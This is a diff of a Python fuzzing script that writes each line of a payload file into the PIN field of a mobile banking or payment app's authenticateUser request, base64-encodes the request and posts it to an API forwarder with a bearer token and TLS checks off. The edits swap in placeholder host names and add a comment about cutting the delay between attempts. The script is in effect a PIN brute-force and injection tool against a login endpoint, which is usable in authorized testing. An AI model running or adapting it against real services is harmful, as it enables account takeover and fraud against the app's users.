@@ -34,26 +34,19 @@ headers = {
     'Accept': 'application/json, text/plain, */*',
     'Origin': 'http://mobileapp.customer.com.za',
     'Authorization': 'Bearer eyJhiI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hNDY3NTY2fQ.cPmk9lA1yypysO100ihXvA',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Galaxy S7 Build/QQ1D.200105.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.186 Mobile Safari/537.36',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Galaxy S7 Build/ AppleWebKit/74.0.3729.186 Mobile Safari/537.36',
     'Innerurl': '',
     'Content-Type': 'text/plain',
-    'Referer': 'http://app.wizit.com.au/home',
+    'Referer': 'http://app.customer.co.za/home',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9',
-    'X-Requested-With': 'au.com.creditcorp.wizit',
+    'X-Requested-With': 'za.co.customer.mobileapp',
     'Connection': 'close',
 }
 
-print(f"{bcolors.RED}\n USAGE: {bcolors.ENDC}")
-print("""\nFuzz-API-Forwarder-b64-1.py RawPOSTData InputFile.txt """)
+print(f"{bcolors.RED}\n USAGE: {bcolors.ENDC}")  # todo list for next version
+print("""\nFuzz-API-Forwarder-b64-1.py RawPOSTData InputFile.txt """)  # to be completed
 print(f"The string {bcolors.RED}FUZZER{bcolors.ENDC} marks the input location is the mark where injection will be performed\n")
-
-"""
-RawPOSTData= str(sys.argv[1])
-print(f"{bcolors.ORANGE}[a] Raw POST Data ")
-print(f"{bcolors.ORANGE}",RawPOSTData)
-print(f"{bcolors.ENDC}")
-"""
 
 inputpayloadfile = sys.argv[1]
 print(f"{bcolors.PURPLE}[a] Input Payload File {bcolors.ENDC}")
@@ -70,7 +63,7 @@ for line in Lines:
 	print(f"{bcolors.RED} INJECTNG PAYLOAD  : ",count, "  FUZZER Value = ",InjectedPayload)
 	print(f"{bcolors.ENDC}")
 
-	RawPOSTData = r'{"uri":"CUS:Authentication/authenticateUser?Mobile=0459966595","httpMethod":"post","request":"{\"os\":\"android\",\"osVersion\":\"10\",\"deviceId\":\"2debe904a24996f9\",\"appName\":\"za.com.customer.mobileapp\",\"appVersion\":\"1.0.45\",\"mobile\":\"0459966595\",\"pin\":\"FUZZER\"}"}'
+	RawPOSTData = r'{"uri":"CUS:Authentication/authenticateUser?Mobile=059966595","httpMethod":"post","request":"{\"os\":\"android\",\"osVersion\":\"10\",\"deviceId\":\"2debe904a24996f9\",\"appName\":\"za.com.customer.mobileapp\",\"appVersion\":\"1.0.45\",\"mobile\":\"0459966595\",\"pin\":\"FUZZER\"}"}'
 	
 	print(f"{bcolors.ENDC}[i]  Raw POST Data {bcolors.ENDC}")
 	print(RawPOSTData, "\n")
@@ -86,7 +79,7 @@ for line in Lines:
 	print(f"{bcolors.OKCYAN}[i]  Base64 Payload {bcolors.ENDC}")
 	print(payload, "\n")
 
-	response = requests.post('https://dev2portal.wizpay.com.au/api/forwarder', headers=headers, data=payload, proxies=proxies, verify=False) # proxies=proxies
+	response = requests.post('https://app.customer.co.za/api/forwarder', headers=headers, data=payload, proxies=proxies, verify=False) 
 
 	print(f"{bcolors.OKGREEN}[o]  Response Status Code {bcolors.ENDC}")
 	print(response.status_code)
@@ -100,4 +93,4 @@ for line in Lines:
 	print(f"{bcolors.WARNING}",pretty_json)
 	print(f"{bcolors.ENDC}")
 
-	time.sleep(1)
+	time.sleep(1)  # optimize the code.... reduce the sleep time LOL
